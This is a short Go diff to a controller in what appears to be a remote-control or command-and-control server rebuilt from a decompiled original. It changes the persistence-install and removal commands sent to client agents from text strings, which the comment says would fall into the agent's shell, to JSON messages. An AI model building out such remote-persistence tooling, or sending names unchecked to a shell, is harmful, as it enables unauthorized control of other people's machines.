@@ -8,6 +8,8 @@
 // 反编译参数集：id（客户端）/ name（安装名）；id 非法时返回 "id err"。
 package controllers
 
+import "encoding/json"
+
 // InstallController 管理客户端持久化安装。
 type InstallController struct {
 	ApiBaseController
@@ -21,7 +23,10 @@ func (c *InstallController) Install() {
 		c.JsonErr("id err")
 		return
 	}
-	if _, err := dispatchCmd(id, "install "+name); err != nil {
+	// JSON 命令：agent 的 CmdPersist（安装持久化）。原版下发文本 "install <name>"，
+	// 复刻端 agent 没有该文本解析器，会落进 shell。
+	req, _ := json.Marshal(map[string]string{"type": "persist", "name": name})
+	if _, err := dispatchCmd(id, string(req)); err != nil {
 		c.JsonErr(err.Error())
 		return
 	}
@@ -36,7 +41,8 @@ func (c *InstallController) Remove() {
 		c.JsonErr("id err")
 		return
 	}
-	if _, err := dispatchCmd(id, "uninstall "+name); err != nil {
+	req, _ := json.Marshal(map[string]string{"type": "cleanup", "name": name})
+	if _, err := dispatchCmd(id, string(req)); err != nil {
 		c.JsonErr(err.Error())
 		return
 	}
